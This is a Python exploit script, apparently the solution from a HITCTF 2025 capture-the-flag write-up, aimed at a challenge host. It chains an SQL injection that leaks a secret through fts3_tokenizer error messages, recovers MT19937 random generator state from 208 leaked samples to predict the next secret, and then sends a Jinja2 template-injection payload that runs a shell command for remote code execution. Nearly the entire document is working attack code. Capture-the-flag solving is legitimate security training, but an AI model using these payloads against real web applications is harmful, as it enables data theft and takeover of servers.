# https://www.turker.cn/archives/hitctf-2025-writeup
import requests
import time
import re
import sys

# Target
URL = "http://<chall>/log"
BACKDOOR_URL = "http://<chall>/backdoor"

# MT19937 Constants
N = 624
M = 397
MATRIX_A = 0x9908b0df
UPPER_MASK = 0x80000000
LOWER_MASK = 0x7fffffff

def undo_right_shift_xor(val, shift):
    res = val
    for i in range(32 // shift + 1):
        res = val ^ (res >> shift)
    return res

def undo_left_shift_xor_mask(val, shift, mask):
    res = val
    for i in range(32 // shift + 1):
            res = val ^ ((res << shift) & mask)
    return res

def untemper(y):
    y = undo_right_shift_xor(y, 18)
    y = undo_left_shift_xor_mask(y, 15, 0xefc60000)
    y = undo_left_shift_xor_mask(y, 7, 0x9d2c5680)
    y = undo_right_shift_xor(y, 11)
    return y

def leak_secret():
  
    payload = "' || fts3_tokenizer((SELECT secret FROM secret)) || '"
  
    try:
        r = requests.post(URL, json={"message": payload})
        if r.status_code == 500:
            match = re.search(r"unknown tokenizer: ([0-9a-f]+)", r.text)
            if match:
                return match.group(1)
            else:
                print(f"Error, no match in: {r.text}")
        else:
            print(f"Unexpected status: {r.status_code}, Body: {r.text}")
    except Exception as e:
        print(f"Request failed: {e}")
    return None

def predict_next(state_array):
    # state_array: list of 624 integers (MT19937 state)
    state = list(state_array)
  
    # Twist
    for i in range(N):
        x = (state[i] & UPPER_MASK) + (state[(i + 1) % N] & LOWER_MASK)
        xA = x >> 1
        if (x % 2) != 0:
            xA ^= MATRIX_A
        state[i] = state[(i + M) % N] ^ xA
  
    # Generate next 3 outputs
    outputs = []
    for i in range(3):
        y = state[i]
        y ^= (y >> 11)
        y ^= (y << 7) & 0x9d2c5680
        y ^= (y << 15) & 0xefc60000
        y ^= (y >> 18)
        outputs.append(y)
  
    # Combine to 96-bit int (Low to High)
    val = outputs[0] + (outputs[1] << 32) + (outputs[2] << 64)
  
    secret_bits = val.to_bytes((val.bit_length() + 7) // 8, byteorder='big')
    if len(secret_bits) < 12:
        secret_bits = b'\x00' * (12 - len(secret_bits)) + secret_bits
    return secret_bits.hex()

def main():
    print("Collecting samples...")
  
    collected_ints = []
  
    for i in range(208):
        s_hex = leak_secret()
        if not s_hex:
            print("Failed to leak secret.")
            return
  
        # print(f"Sample {i+1}: {s_hex}")
  
        val = int(s_hex, 16)
        v1 = val & 0xffffffff
        v2 = (val >> 32) & 0xffffffff
        v3 = (val >> 64) & 0xffffffff
  
        collected_ints.append(untemper(v1))
        collected_ints.append(untemper(v2))
        collected_ints.append(untemper(v3))
  
        # Progress
        if (i+1) % 10 == 0:
            print(f"Progress: {i+1}/208")
  
    print("Predicting next secret...")
    next_secret = predict_next(collected_ints)
    print(f"Predicted: {next_secret}")
  
    payload_code = "{{ config.__class__.__init__.__globals__['os'].popen('/readflag').read() }}"
  
    print("Sending backdoor request...")
    r = requests.post(BACKDOOR_URL, json={
        "secret": next_secret,
        "code": payload_code
    })
  
    print(r.text)
  
    if "success" in r.text and r.json().get("success"):
        print("RCE Successful!")
        print("Result:", r.json().get("result"))

if __name__ == "__main__":
    main()